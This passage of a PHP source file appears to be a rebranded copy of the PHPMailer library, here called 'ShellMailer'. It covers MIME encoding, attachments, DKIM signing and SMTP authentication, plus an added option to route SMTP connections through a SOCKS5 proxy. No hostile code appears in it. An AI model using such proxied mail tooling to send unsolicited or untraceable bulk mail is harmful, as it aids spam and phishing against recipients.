        return $encoded;
    }
    public function hasMultiBytes($str) {
        if (function_exists('mb_strlen')) {
            return (strlen($str) > mb_strlen($str, $this->CharSet));
        } else {
            return false;
        }
    }
    public function has8bitChars($text) {
        return (boolean) preg_match('/[\x80-\xFF]/', $text);
    }
    public function base64EncodeWrapMB($str, $linebreak = null) {
        $start   = '=?' . $this->CharSet . '?B?';
        $end     = '?=';
        $encoded = '';
        if ($linebreak === null) {
            $linebreak = $this->LE;
        }
        $mb_length = mb_strlen($str, $this->CharSet);
        $length    = 75 - strlen($start) - strlen($end);
        $ratio     = $mb_length / strlen($str);
        $avgLength = floor($length * $ratio * .75);
        for ($i = 0; $i < $mb_length; $i += $offset) {
            $lookBack = 0;
            do {
                $offset = $avgLength - $lookBack;
                $chunk  = mb_substr($str, $i, $offset, $this->CharSet);
                $chunk  = base64_encode($chunk);
                $lookBack++;
            } while (strlen($chunk) > $length);
            $encoded .= $chunk . $linebreak;
        }
        $encoded = substr($encoded, 0, -strlen($linebreak));
        return $encoded;
    }
    public function encodeQP($string, $line_max = 76) {
        if (function_exists('quoted_printable_encode')) {
            return quoted_printable_encode($string);
        }
        $string = str_replace(array(
            '%20',
            '%0D%0A.',
            '%0D%0A',
            '%'
        ), array(
            ' ',
            "\r\n=2E",
            "\r\n",
            '='
        ), rawurlencode($string));
        return preg_replace('/[^\r\n]{' . ($line_max - 3) . '}[^=\r\n]{2}/', "$0=\r\n", $string);
    }
    public function encodeQPphp($string, $line_max = 76, $space_conv = false) {
        return $this->encodeQP($string, $line_max);
    }
    public function encodeQ($str, $position = 'text') {
        $pattern = '';
        $encoded = str_replace(array(
            "\r",
            "\n"
        ), '', $str);
        switch (strtolower($position)) {
            case 'phrase':
                $pattern = '^A-Za-z0-9!*+\/ -';
                break;
            case 'comment':
                $pattern = '\(\)"';
            case 'text':
            default:
                $pattern = '\000-\011\013\014\016-\037\075\077\137\177-\377' . $pattern;
                break;
        }
        $matches = array();
        if (preg_match_all("/[{$pattern}]/", $encoded, $matches)) {
            $eqkey = array_search('=', $matches[0]);
            if (false !== $eqkey) {
                unset($matches[0][$eqkey]);
                array_unshift($matches[0], '=');
            }
            foreach (array_unique($matches[0]) as $char) {
                $encoded = str_replace($char, '=' . sprintf('%02X', ord($char)), $encoded);
            }
        }
        return str_replace(' ', '_', $encoded);
    }
    public function addStringAttachment($string, $filename, $encoding = 'base64', $type = '', $disposition = 'attachment') {
        if ($type == '') {
            $type = self::filenameToType($filename);
        }
        $this->attachment[] = array(
            0 => $string,
            1 => $filename,
            2 => basename($filename),
            3 => $encoding,
            4 => $type,
            5 => true,
            6 => $disposition,
            7 => 0
        );
    }
    public function addEmbeddedImage($path, $cid, $name = '', $encoding = 'base64', $type = '', $disposition = 'inline') {
        if (!@is_file($path)) {
            $this->setError($this->lang('file_access') . $path);
            return false;
        }
        if ($type == '') {
            $type = self::filenameToType($path);
        }
        $filename = basename($path);
        if ($name == '') {
            $name = $filename;
        }
        $this->attachment[] = array(
            0 => $path,
            1 => $filename,
            2 => $name,
            3 => $encoding,
            4 => $type,
            5 => false,
            6 => $disposition,
            7 => $cid
        );
        return true;
    }
    public function addStringEmbeddedImage($string, $cid, $name = '', $encoding = 'base64', $type = '', $disposition = 'inline') {
        if ($type == '' and !empty($name)) {
            $type = self::filenameToType($name);
        }
        $this->attachment[] = array(
            0 => $string,
            1 => $name,
            2 => $name,
            3 => $encoding,
            4 => $type,
            5 => true,
            6 => $disposition,
            7 => $cid
        );
        return true;
    }
    public function inlineImageExists() {
        foreach ($this->attachment as $attachment) {
            if ($attachment[6] == 'inline') {
                return true;
            }
        }
        return false;
    }
    public function attachmentExists() {
        foreach ($this->attachment as $attachment) {
            if ($attachment[6] == 'attachment') {
                return true;
            }
        }
        return false;
    }
    public function alternativeExists() {
        return !empty($this->AltBody);
    }
    public function clearQueuedAddresses($kind) {
        $RecipientsQueue = $this->RecipientsQueue;
        foreach ($RecipientsQueue as $address => $params) {
            if ($params[0] == $kind) {
                unset($this->RecipientsQueue[$address]);
            }
        }
    }
    public function clearAddresses() {
        foreach ($this->to as $to) {
            unset($this->all_recipients[strtolower($to[0])]);
        }
        $this->to = array();
        $this->clearQueuedAddresses('to');
    }
    public function clearCCs() {
        foreach ($this->cc as $cc) {
            unset($this->all_recipients[strtolower($cc[0])]);
        }
        $this->cc = array();
        $this->clearQueuedAddresses('cc');
    }
    public function clearBCCs() {
        foreach ($this->bcc as $bcc) {
            unset($this->all_recipients[strtolower($bcc[0])]);
        }
        $this->bcc = array();
        $this->clearQueuedAddresses('bcc');
    }
    public function clearReplyTos() {
        $this->ReplyTo      = array();
        $this->ReplyToQueue = array();
    }
    public function clearAllRecipients() {
        $this->to              = array();
        $this->cc              = array();
        $this->bcc             = array();
        $this->all_recipients  = array();
        $this->RecipientsQueue = array();
    }
    public function clearAttachments() {
        $this->attachment = array();
    }
    public function clearCustomHeaders() {
        $this->CustomHeader = array();
    }
    protected function setError($msg) {
        $this->error_count++;
        if ($this->Mailer == 'smtp' and !is_null($this->smtp)) {
            $lasterror = $this->smtp->getError();
            if (!empty($lasterror['error'])) {
                $msg .= $this->lang('smtp_error') . $lasterror['error'];
                if (!empty($lasterror['detail'])) {
                    $msg .= ' Detail: ' . $lasterror['detail'];
                }
                if (!empty($lasterror['smtp_code'])) {
                    $msg .= ' SMTP code: ' . $lasterror['smtp_code'];
                }
                if (!empty($lasterror['smtp_code_ex'])) {
                    $msg .= ' Additional SMTP info: ' . $lasterror['smtp_code_ex'];
                }
            }
        }
        $this->ErrorInfo = $msg;
    }
    public static function rfcDate() {
        date_default_timezone_set(@date_default_timezone_get());
        return date('D, j M Y H:i:s O');
    }
    protected function serverHostname() {
        $result = 'localhost.localdomain';
        if (!empty($this->Hostname)) {
            $result = $this->Hostname;
        } elseif (isset($_SERVER) and array_key_exists('SERVER_NAME', $_SERVER) and !empty($_SERVER['SERVER_NAME'])) {
            $result = $_SERVER['SERVER_NAME'];
        } elseif (function_exists('gethostname') && gethostname() !== false) {
            $result = gethostname();
        } elseif (php_uname('n') !== false) {
            $result = php_uname('n');
        }
        return $result;
    }
    protected function lang($key) {
        if (count($this->language) < 1) {
            $this->setLanguage('en');
        }
        if (array_key_exists($key, $this->language)) {
            if ($key == 'smtp_connect_failed') {
                return $this->language[$key] . ' https://github.com/ShellMailer/ShellMailer/wiki/Troubleshooting';
            }
            return $this->language[$key];
        } else {
            return $key;
        }
    }
    public function isError() {
        return ($this->error_count > 0);
    }
    public function fixEOL($str) {
        $nstr = str_replace(array(
            "\r\n",
            "\r"
        ), "\n", $str);
        if ($this->LE !== "\n") {
            $nstr = str_replace("\n", $this->LE, $nstr);
        }
        return $nstr;
    }
    public function addCustomHeader($name, $value = null) {
        if ($value === null) {
            $this->CustomHeader[] = explode(':', $name, 2);
        } else {
            $this->CustomHeader[] = array(
                $name,
                $value
            );
        }
    }
    public function getCustomHeaders() {
        return $this->CustomHeader;
    }
    public function msgHTML($message, $basedir = '', $advanced = false) {
        preg_match_all('/(src|background)=["\'](.*)["\']/Ui', $message, $images);
        if (array_key_exists(2, $images)) {
            if (strlen($basedir) > 1 && substr($basedir, -1) != '/') {
                $basedir .= '/';
            }
            foreach ($images[2] as $imgindex => $url) {
                if (preg_match('#^data:(image[^;,]*)(;base64)?,#', $url, $match)) {
                    $data = substr($url, strpos($url, ','));
                    if ($match[2]) {
                        $data = base64_decode($data);
                    } else {
                        $data = rawurldecode($data);
                    }
                    $cid = md5($url) . '@phpmailer.0';
                    if ($this->addStringEmbeddedImage($data, $cid, 'embed' . $imgindex, 'base64', $match[1])) {
                        $message = str_replace($images[0][$imgindex], $images[1][$imgindex] . '="cid:' . $cid . '"', $message);
                    }
                    continue;
                }
                if (!empty($basedir) && (strpos($url, '..') === false) && substr($url, 0, 4) !== 'cid:' && !preg_match('#^[a-z][a-z0-9+.-]*:?//#i', $url)) {
                    $filename  = basename($url);
                    $directory = dirname($url);
                    if ($directory == '.') {
                        $directory = '';
                    }
                    $cid = md5($url) . '@phpmailer.0';
                    if (strlen($directory) > 1 && substr($directory, -1) != '/') {
                        $directory .= '/';
                    }
                    if ($this->addEmbeddedImage($basedir . $directory . $filename, $cid, $filename, 'base64', self::_mime_types((string) self::mb_pathinfo($filename, PATHINFO_EXTENSION)))) {
                        $message = preg_replace('/' . $images[1][$imgindex] . '=["\']' . preg_quote($url, '/') . '["\']/Ui', $images[1][$imgindex] . '="cid:' . $cid . '"', $message);
                    }
                }
            }
        }
        $this->isHTML(true);
        $this->Body    = $this->normalizeBreaks($message);
        $this->AltBody = $this->normalizeBreaks($this->html2text($message, $advanced));
        if (!$this->alternativeExists()) {
            $this->AltBody = 'To view this email message, open it in a program that understands HTML!' . self::CRLF . self::CRLF;
        }
        return $this->Body;
    }
    public function html2text($html, $advanced = false) {
        if (is_callable($advanced)) {
            return call_user_func($advanced, $html);
        }
        return html_entity_decode(trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/si', '', $html))), ENT_QUOTES, $this->CharSet);
    }
    public static function _mime_types($ext = '') {
        $mimes = array(
            'xl' => 'application/excel',
            'js' => 'application/javascript',
            'hqx' => 'application/mac-binhex40',
            'cpt' => 'application/mac-compactpro',
            'bin' => 'application/macbinary',
            'doc' => 'application/msword',
            'word' => 'application/msword',
            'xlsx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            'xltx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.template',
            'potx' => 'application/vnd.openxmlformats-officedocument.presentationml.template',
            'ppsx' => 'application/vnd.openxmlformats-officedocument.presentationml.slideshow',
            'pptx' => 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
            'sldx' => 'application/vnd.openxmlformats-officedocument.presentationml.slide',
            'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            'dotx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.template',
            'xlam' => 'application/vnd.ms-excel.addin.macroEnabled.12',
            'xlsb' => 'application/vnd.ms-excel.sheet.binary.macroEnabled.12',
            'class' => 'application/octet-stream',
            'dll' => 'application/octet-stream',
            'dms' => 'application/octet-stream',
            'exe' => 'application/octet-stream',
            'lha' => 'application/octet-stream',
            'lzh' => 'application/octet-stream',
            'psd' => 'application/octet-stream',
            'sea' => 'application/octet-stream',
            'so' => 'application/octet-stream',
            'oda' => 'application/oda',
            'pdf' => 'application/pdf',
            'ai' => 'application/postscript',
            'eps' => 'application/postscript',
            'ps' => 'application/postscript',
            'smi' => 'application/smil',
            'smil' => 'application/smil',
            'mif' => 'application/vnd.mif',
            'xls' => 'application/vnd.ms-excel',
            'ppt' => 'application/vnd.ms-powerpoint',
            'wbxml' => 'application/vnd.wap.wbxml',
            'wmlc' => 'application/vnd.wap.wmlc',
            'dcr' => 'application/x-director',
            'dir' => 'application/x-director',
            'dxr' => 'application/x-director',
            'dvi' => 'application/x-dvi',
            'gtar' => 'application/x-gtar',
            'php3' => 'application/x-httpd-php',
            'php4' => 'application/x-httpd-php',
            'php' => 'application/x-httpd-php',
            'phtml' => 'application/x-httpd-php',
            'phps' => 'application/x-httpd-php-source',
            'swf' => 'application/x-shockwave-flash',
            'sit' => 'application/x-stuffit',
            'tar' => 'application/x-tar',
            'tgz' => 'application/x-tar',
            'xht' => 'application/xhtml+xml',
            'xhtml' => 'application/xhtml+xml',
            'zip' => 'application/zip',
            'mid' => 'audio/midi',
            'midi' => 'audio/midi',
            'mp2' => 'audio/mpeg',
            'mp3' => 'audio/mpeg',
            'mpga' => 'audio/mpeg',
            'aif' => 'audio/x-aiff',
            'aifc' => 'audio/x-aiff',
            'aiff' => 'audio/x-aiff',
            'ram' => 'audio/x-pn-realaudio',
            'rm' => 'audio/x-pn-realaudio',
            'rpm' => 'audio/x-pn-realaudio-plugin',
            'ra' => 'audio/x-realaudio',
            'wav' => 'audio/x-wav',
            'bmp' => 'image/bmp',
            'gif' => 'image/gif',
            'jpeg' => 'image/jpeg',
            'jpe' => 'image/jpeg',
            'jpg' => 'image/jpeg',
            'png' => 'image/png',
            'tiff' => 'image/tiff',
            'tif' => 'image/tiff',
            'eml' => 'message/rfc822',
            'css' => 'text/css',
            'html' => 'text/html',
            'htm' => 'text/html',
            'shtml' => 'text/html',
            'log' => 'text/plain',
            'text' => 'text/plain',
            'txt' => 'text/plain',
            'rtx' => 'text/richtext',
            'rtf' => 'text/rtf',
            'vcf' => 'text/vcard',
            'vcard' => 'text/vcard',
            'xml' => 'text/xml',
            'xsl' => 'text/xml',
            'mpeg' => 'video/mpeg',
            'mpe' => 'video/mpeg',
            'mpg' => 'video/mpeg',
            'mov' => 'video/quicktime',
            'qt' => 'video/quicktime',
            'rv' => 'video/vnd.rn-realvideo',
            'avi' => 'video/x-msvideo',
            'movie' => 'video/x-sgi-movie'
        );
        if (array_key_exists(strtolower($ext), $mimes)) {
            return $mimes[strtolower($ext)];
        }
        return 'application/octet-stream';
    }
    public static function filenameToType($filename) {
        $qpos = strpos($filename, '?');
        if (false !== $qpos) {
            $filename = substr($filename, 0, $qpos);
        }
        $pathinfo = self::mb_pathinfo($filename);
        return self::_mime_types($pathinfo['extension']);
    }
    public static function mb_pathinfo($path, $options = null) {
        $ret      = array(
            'dirname' => '',
            'basename' => '',
            'extension' => '',
            'filename' => ''
        );
        $pathinfo = array();
        if (preg_match('%^(.*?)[\\\\/]*(([^/\\\\]*?)(\.([^\.\\\\/]+?)|))[\\\\/\.]*$%im', $path, $pathinfo)) {
            if (array_key_exists(1, $pathinfo)) {
                $ret['dirname'] = $pathinfo[1];
            }
            if (array_key_exists(2, $pathinfo)) {
                $ret['basename'] = $pathinfo[2];
            }
            if (array_key_exists(5, $pathinfo)) {
                $ret['extension'] = $pathinfo[5];
            }
            if (array_key_exists(3, $pathinfo)) {
                $ret['filename'] = $pathinfo[3];
            }
        }
        switch ($options) {
            case PATHINFO_DIRNAME:
            case 'dirname':
                return $ret['dirname'];
            case PATHINFO_BASENAME:
            case 'basename':
                return $ret['basename'];
            case PATHINFO_EXTENSION:
            case 'extension':
                return $ret['extension'];
            case PATHINFO_FILENAME:
            case 'filename':
                return $ret['filename'];
            default:
                return $ret;
        }
    }
    public function set($name, $value = '') {
        if (property_exists($this, $name)) {
            $this->$name = $value;
            return true;
        } else {
            $this->setError($this->lang('variable_set') . $name);
            return false;
        }
    }
    public function secureHeader($str) {
        return trim(str_replace(array(
            "\r",
            "\n"
        ), '', $str));
    }
    public static function normalizeBreaks($text, $breaktype = "\r\n") {
        return preg_replace('/(\r\n|\r|\n)/ms', $breaktype, $text);
    }
    public function sign($cert_filename, $key_filename, $key_pass, $extracerts_filename = '') {
        $this->sign_cert_file       = $cert_filename;
        $this->sign_key_file        = $key_filename;
        $this->sign_key_pass        = $key_pass;
        $this->sign_extracerts_file = $extracerts_filename;
    }
    public function DKIM_QP($txt) {
        $line = '';
        for ($i = 0; $i < strlen($txt); $i++) {
            $ord = ord($txt[$i]);
            if (((0x21 <= $ord) && ($ord <= 0x3A)) || $ord == 0x3C || ((0x3E <= $ord) && ($ord <= 0x7E))) {
                $line .= $txt[$i];
            } else {
                $line .= '=' . sprintf('%02X', $ord);
            }
        }
        return $line;
    }
    public function DKIM_Sign($signHeader) {
        if (!defined('PKCS7_TEXT')) {
            if ($this->exceptions) {
                throw new phpmailerException($this->lang('extension_missing') . 'openssl');
            }
            return '';
        }
        $privKeyStr = !empty($this->DKIM_private_string) ? $this->DKIM_private_string : @file_get_contents($this->DKIM_private);
        if ('' != $this->DKIM_passphrase) {
            $privKey = openssl_pkey_get_private($privKeyStr, $this->DKIM_passphrase);
        } else {
            $privKey = openssl_pkey_get_private($privKeyStr);
        }
        if (version_compare(PHP_VERSION, '5.3.0') >= 0 and in_array('sha256WithRSAEncryption', openssl_get_md_methods(true))) {
            if (openssl_sign($signHeader, $signature, $privKey, 'sha256WithRSAEncryption')) {
                openssl_pkey_free($privKey);
                return base64_encode($signature);
            }
        } else {
            $pinfo = openssl_pkey_get_details($privKey);
            $hash  = hash('sha256', $signHeader);
            $t     = '3031300d060960864801650304020105000420' . $hash;
            $pslen = $pinfo['bits'] / 8 - (strlen($t) / 2 + 3);
            $eb    = pack('H*', '0001' . str_repeat('FF', $pslen) . '00' . $t);
            if (openssl_private_encrypt($eb, $signature, $privKey, OPENSSL_NO_PADDING)) {
                openssl_pkey_free($privKey);
                return base64_encode($signature);
            }
        }
        openssl_pkey_free($privKey);
        return '';
    }
    public function DKIM_HeaderC($signHeader) {
        $signHeader = preg_replace('/\r\n\s+/', ' ', $signHeader);
        $lines      = explode("\r\n", $signHeader);
        foreach ($lines as $key => $line) {
            list($heading, $value) = explode(':', $line, 2);
            $heading     = strtolower($heading);
            $value       = preg_replace('/\s{2,}/', ' ', $value);
            $lines[$key] = $heading . ':' . trim($value);
        }
        $signHeader = implode("\r\n", $lines);
        return $signHeader;
    }
    public function DKIM_BodyC($body) {
        if ($body == '') {
            return "\r\n";
        }
        $body = str_replace("\r\n", "\n", $body);
        $body = str_replace("\n", "\r\n", $body);
        while (substr($body, strlen($body) - 4, 4) == "\r\n\r\n") {
            $body = substr($body, 0, strlen($body) - 2);
        }
        return $body;
    }
    public function DKIM_Add($headers_line, $subject, $body) {
        $DKIMsignatureType    = 'rsa-sha256';
        $DKIMcanonicalization = 'relaxed/simple';
        $DKIMquery            = 'dns/txt';
        $DKIMtime             = time();
        $subject_header       = "Subject: $subject";
        $headers              = explode($this->LE, $headers_line);
        $from_header          = '';
        $to_header            = '';
        $date_header          = '';
        $current              = '';
        foreach ($headers as $header) {
            if (strpos($header, 'From:') === 0) {
                $from_header = $header;
                $current     = 'from_header';
            } elseif (strpos($header, 'To:') === 0) {
                $to_header = $header;
                $current   = 'to_header';
            } elseif (strpos($header, 'Date:') === 0) {
                $date_header = $header;
                $current     = 'date_header';
            } else {
                if (!empty($$current) && strpos($header, ' =?') === 0) {
                    $$current .= $header;
                } else {
                    $current = '';
                }
            }
        }
        $from    = str_replace('|', '=7C', $this->DKIM_QP($from_header));
        $to      = str_replace('|', '=7C', $this->DKIM_QP($to_header));
        $date    = str_replace('|', '=7C', $this->DKIM_QP($date_header));
        $subject = str_replace('|', '=7C', $this->DKIM_QP($subject_header));
        $body    = $this->DKIM_BodyC($body);
        $DKIMlen = strlen($body);
        $DKIMb64 = base64_encode(pack('H*', hash('sha256', $body)));
        if ('' == $this->DKIM_identity) {
            $ident = '';
        } else {
            $ident = ' i=' . $this->DKIM_identity . ';';
        }
        $dkimhdrs = 'DKIM-Signature: v=1; a=' . $DKIMsignatureType . '; q=' . $DKIMquery . '; l=' . $DKIMlen . '; s=' . $this->DKIM_selector . ";\r\n" . "\tt=" . $DKIMtime . '; c=' . $DKIMcanonicalization . ";\r\n" . "\th=From:To:Date:Subject;\r\n" . "\td=" . $this->DKIM_domain . ';' . $ident . "\r\n" . "\tz=$from\r\n" . "\t|$to\r\n" . "\t|$date\r\n" . "\t|$subject;\r\n" . "\tbh=" . $DKIMb64 . ";\r\n" . "\tb=";
        $toSign   = $this->DKIM_HeaderC($from_header . "\r\n" . $to_header . "\r\n" . $date_header . "\r\n" . $subject_header . "\r\n" . $dkimhdrs);
        $signed   = $this->DKIM_Sign($toSign);
        return $dkimhdrs . $signed . "\r\n";
    }
    public static function hasLineLongerThanMax($str) {
        return (boolean) preg_match('/^(.{' . (self::MAX_LINE_LENGTH + 2) . ',})/m', $str);
    }
    public function getToAddresses() {
        return $this->to;
    }
    public function getCcAddresses() {
        return $this->cc;
    }
    public function getBccAddresses() {
        return $this->bcc;
    }
    public function getReplyToAddresses() {
        return $this->ReplyTo;
    }
    public function getAllRecipientAddresses() {
        return $this->all_recipients;
    }
    protected function doCallback($isSent, $to, $cc, $bcc, $subject, $body, $from) {
        if (!empty($this->action_function) && is_callable($this->action_function)) {
            $params = array(
                $isSent,
                $to,
                $cc,
                $bcc,
                $subject,
                $body,
                $from
            );
            call_user_func_array($this->action_function, $params);
        }
    }
}
class phpmailerException extends Exception {
    public function errorMessage() {
        $errorMsg = '<strong>' . $this->getMessage() . "</strong><br />\n";
        return $errorMsg;
    }
}
class SMTP {
    const CRLF = "\r\n";
    const DEFAULT_SMTP_PORT = 25;
    const MAX_LINE_LENGTH = 998;
    const DEBUG_OFF = 0;
    const DEBUG_CLIENT = 1;
    const DEBUG_SERVER = 2;
    const DEBUG_CONNECTION = 3;
    const DEBUG_LOWLEVEL = 4;
    public $SMTP_PORT = 25;
    public $CRLF = "\r\n";
    public $do_debug = self::DEBUG_OFF;
    public $Debugoutput = 'echo';
    public $do_verp = false;
    public $Timeout = 10;
    public $Timelimit = 10;
    public $UseSocks = false;
    public $SocksHost = null;
    public $SocksPort = 0;
    protected $smtp_transaction_id_patterns = array('exim' => '/[0-9]{3} OK id=(.*)/', 'sendmail' => '/[0-9]{3} 2.0.0 (.*) Message/', 'postfix' => '/[0-9]{3} 2.0.0 Ok: queued as (.*)/');
    protected $smtp_conn;
    protected $error = array('error' => '', 'detail' => '', 'smtp_code' => '', 'smtp_code_ex' => '');
    protected $helo_rply = null;
    protected $server_caps = null;
    protected $last_reply = '';
    protected function edebug($str, $level = 0) {
        if ($level > $this->do_debug) {
            return;
        }
        if (!in_array($this->Debugoutput, array(
            'error_log',
            'html',
            'echo'
        )) and is_callable($this->Debugoutput)) {
            call_user_func($this->Debugoutput, $str, $level);
            return;
        }
        switch ($this->Debugoutput) {
            case 'error_log':
                error_log($str);
                break;
            case 'html':
                echo htmlentities(preg_replace('/[\r\n]+/', '', $str), ENT_QUOTES, 'UTF-8') . "<br>\n";
                break;
            case 'echo':
            default:
                $str = preg_replace('/(\r\n|\r|\n)/ms', "\n", $str);
                echo gmdate('Y-m-d H:i:s') . "\t" . str_replace("\n", "\n                   \t                  ", trim($str)) . "\n";
        }
    }
    public function connect($host, $port = null, $timeout = 10, $options = array()) {
        static $streamok;
        if (is_null($streamok)) {
            $streamok = function_exists('stream_socket_client');
        }
        $this->setError('');
        if ($this->connected()) {
            $this->setError('Already connected to a server');
            return false;
        }
        if (empty($port)) {
            $port = self::DEFAULT_SMTP_PORT;
        }
        if ($this->UseSocks) {
            $this->edebug("Connection: opening to $host:$port, socks={$this->SocksHost}:{$this->SocksPort}, timeout=$timeout, options=" . var_export($options, true), self::DEBUG_CONNECTION);
            $SocksSocket = @fsockopen($this->SocksHost, $this->SocksPort, $errno, $errbuf, $timeout);
            if (!$SocksSocket) {
                $this->edebug("Connection to SOCKS server could not be established on " . $this->SocksHost . ":" . $this->SocksPort . " (Connection refused)", self::DEBUG_CONNECTION);
                return false;
            }
            fwrite($SocksSocket, pack("C3", 0x05, 0x01, 0x00));
            $SocksStatus = fread($SocksSocket, 8192);
            $responce    = unpack("Cversion/Cmethod", $SocksStatus);
            if ($responce["version"] != 0x05 and $responce["method"] != 0x00) {
                $this->edebug("SOCKS Server does not support this version and/or authentication method of SOCKS.", self::DEBUG_CONNECTION);
                return false;
            }
            if (ip2long($host) == -1) {
                fwrite($SocksSocket, pack("C5", 0x05, 0x01, 0x00, 0x03, strlen($host)) . $host . pack("n", $port));
            } else {
                fwrite($SocksSocket, pack("C4Nn", 0x05, 0x01, 0x00, 0x01, ip2long(gethostbyname($host)), $port));
            }
            $SocksStatus = fread($SocksSocket, 8192);
            $responce    = unpack("Cversion/Cresult/Creg/Ctype/Lip/Sport", $SocksStatus);
            if ($responce["version"] == 0x05 and $responce["result"] == 0x00) {
                $this->smtp_conn = $SocksSocket;
            } else {
                $this->edebug("The SOCKS server failed to connect to the specificed host and port. ( " . $host . ":" . $port . " )", self::DEBUG_CONNECTION);
                return false;
            }
        } else {
            $this->edebug("Connection: opening to $host:$port, timeout=$timeout, options=" . var_export($options, true), self::DEBUG_CONNECTION);
            $errno  = 0;
            $errstr = '';
            if ($streamok) {
                $socket_context  = stream_context_create($options);
                $this->smtp_conn = @stream_socket_client($host . ":" . $port, $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $socket_context);
            } else {
                $this->edebug("Connection: stream_socket_client not available, falling back to fsockopen", self::DEBUG_CONNECTION);
                $this->smtp_conn = fsockopen($host, $port, $errno, $errstr, $timeout);
            }
        }
        if (!is_resource($this->smtp_conn)) {
            $this->setError('Failed to connect to server', $errno, $errstr);
            $this->edebug('SMTP ERROR: ' . $this->error['error'] . ": $errstr ($errno)", self::DEBUG_CLIENT);
            return false;
        }
        $this->edebug('Connection: opened', self::DEBUG_CONNECTION);
        if (substr(PHP_OS, 0, 3) != 'WIN') {
            $max = ini_get('max_execution_time');
            if ($max != 0 && $timeout > $max) {
                @set_time_limit($timeout);
            }
            stream_set_timeout($this->smtp_conn, $timeout, 0);
        }
        $announce = $this->get_lines();
        $this->edebug('SERVER -> CLIENT: ' . $announce, self::DEBUG_SERVER);
        return true;
    }
    public function startTLS() {
        if (!$this->sendCommand('STARTTLS', 'STARTTLS', 220)) {
            return false;
        }
        $crypto_method = STREAM_CRYPTO_METHOD_TLS_CLIENT;
        if (defined('STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT')) {
            $crypto_method |= STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT;
            $crypto_method |= STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT;
        }
        if (!stream_socket_enable_crypto($this->smtp_conn, true, $crypto_method)) {
            return false;
        }
        return true;
    }
    public function authenticate($username, $password, $authtype = null, $realm = '', $workstation = '', $OAuth = null) {
        if (!$this->server_caps) {
            $this->setError('Authentication is not allowed before HELO/EHLO');
            return false;
        }
        if (array_key_exists('EHLO', $this->server_caps)) {
            if (!array_key_exists('AUTH', $this->server_caps)) {
                $this->setError('Authentication is not allowed at this stage');
                return false;
            }
            self::edebug('Auth method requested: ' . ($authtype ? $authtype : 'UNKNOWN'), self::DEBUG_LOWLEVEL);
            self::edebug('Auth methods available on the server: ' . implode(',', $this->server_caps['AUTH']), self::DEBUG_LOWLEVEL);
            if (empty($authtype)) {
                foreach (array(
                    'CRAM-MD5',
                    'LOGIN',
                    'PLAIN',
                    'NTLM',
                    'XOAUTH2'
                ) as $method) {
                    if (in_array($method, $this->server_caps['AUTH'])) {
                        $authtype = $method;
                        break;
                    }
                }
                if (empty($authtype)) {
                    $this->setError('No supported authentication methods found');
                    return false;
                }
                self::edebug('Auth method selected: ' . $authtype, self::DEBUG_LOWLEVEL);
            }
            if (!in_array($authtype, $this->server_caps['AUTH'])) {
                $this->setError("The requested authentication method \"$authtype\" is not supported by the server");
                return false;
            }
        } elseif (empty($authtype)) {
            $authtype = 'LOGIN';
        }
        switch ($authtype) {
            case 'PLAIN':
                if (!$this->sendCommand('AUTH', 'AUTH PLAIN', 334)) {
                    return false;
                }
                if (!$this->sendCommand('User & Password', base64_encode("\0" . $username . "\0" . $password), 235)) {
                    return false;
                }
                break;
            case 'LOGIN':
                if (!$this->sendCommand('AUTH', 'AUTH LOGIN', 334)) {
                    return false;
                }
                if (!$this->sendCommand("Username", base64_encode($username), 334)) {
                    return false;
                }
                if (!$this->sendCommand("Password", base64_encode($password), 235)) {
                    return false;
                }
                break;
            case 'XOAUTH2':
                if (is_null($OAuth)) {
                    return false;
                }
                $oauth = $OAuth->getOauth64();
                if (!$this->sendCommand('AUTH', 'AUTH XOAUTH2 ' . $oauth, 235)) {
                    return false;
                }
                break;
            case 'NTLM':
                $temp        = new stdClass;
                $ntlm_client = new ntlm_sasl_client_class;
                if (!$ntlm_client->initialize($temp)) {
                    $this->setError($temp->error);
                    $this->edebug('You need to enable some modules in your php.ini file: ' . $this->error['error'], self::DEBUG_CLIENT);
                    return false;
                }
                $msg1 = $ntlm_client->typeMsg1($realm, $workstation);
                if (!$this->sendCommand('AUTH NTLM', 'AUTH NTLM ' . base64_encode($msg1), 334)) {
                    return false;
                }
                $challenge = substr($this->last_reply, 3);
                $challenge = base64_decode($challenge);
                $ntlm_res  = $ntlm_client->NTLMResponse(substr($challenge, 24, 8), $password);
                $msg3      = $ntlm_client->typeMsg3($ntlm_res, $username, $realm, $workstation);
                return $this->sendCommand('Username', base64_encode($msg3), 235);
            case 'CRAM-MD5':
                if (!$this->sendCommand('AUTH CRAM-MD5', 'AUTH CRAM-MD5', 334)) {
                    return false;
                }
                $challenge = base64_decode(substr($this->last_reply, 4));
                $response  = $username . ' ' . $this->hmac($challenge, $password);
                return $this->sendCommand('Username', base64_encode($response), 235);
            default:
                $this->setError("Authentication method \"$authtype\" is not supported");
                return false;
        }
        return true;
    }
    protected function hmac($data, $key) {
        if (function_exists('hash_hmac')) {
            return hash_hmac('md5', $data, $key);
        }
        $bytelen = 64;
        if (strlen($key) > $bytelen) {
            $key = pack('H*', md5($key));
        }
        $key    = str_pad($key, $bytelen, chr(0x00));
        $ipad   = str_pad('', $bytelen, chr(0x36));
        $opad   = str_pad('', $bytelen, chr(0x5c));
        $k_ipad = $key ^ $ipad;
        $k_opad = $key ^ $opad;
        return md5($k_opad . pack('H*', md5($k_ipad . $data)));
    }
    public function connected() {
        if (is_resource($this->smtp_conn)) {
            $sock_status = stream_get_meta_data($this->smtp_conn);
            if ($sock_status['eof']) {
                $this->edebug('SMTP NOTICE: EOF caught while checking if connected', self::DEBUG_CLIENT);
                $this->close();
                return false;
            }
            return true;
        }
        return false;
    }
    public function close() {
        $this->setError('');
        $this->server_caps = null;
        $this->helo_rply   = null;
        if (is_resource($this->smtp_conn)) {
            fclose($this->smtp_conn);
            $this->smtp_conn = null;
            $this->edebug('Connection: closed', self::DEBUG_CONNECTION);
        }
    }
    public function data($msg_data) {
        if (!$this->sendCommand('DATA', 'DATA', 354)) {
            return false;
        }
        $lines      = explode("\n", str_replace(array(
            "\r\n",
            "\r"
        ), "\n", $msg_data));
